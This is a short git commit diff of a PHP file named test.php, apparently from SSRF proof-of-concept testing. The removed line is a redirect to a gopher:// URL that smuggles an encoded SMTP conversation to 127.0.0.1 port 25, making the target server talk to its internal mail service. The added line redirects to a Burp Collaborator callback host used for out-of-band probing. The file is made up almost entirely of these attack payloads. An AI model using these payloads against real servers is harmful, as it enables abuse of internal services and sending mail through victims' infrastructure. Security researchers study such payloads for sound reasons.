ceff87e42717d8e7985494205873dbebfba3564c
anishacks <66885893+anishacks@users.noreply.github.com>
2021-03-18 20:07:54 +0530

    Update test.php

--- test.php
+++ test.php
@@ -1,3 +1,3 @@
 <?php
-header(‘location: gopher://127.0.0.1:25/_MAIL%20FROM:google%40com%0ARCPT%20To:anishacks%20gmail%20com%0ADATA%0AFrom:google%40com%0ASubject:PoCSSRF%0AMessage:%0A.’);
+header('location: https://dl0th9y5xapgqe35knyb16sxyomd.burpcollaborator.net');
 ?>
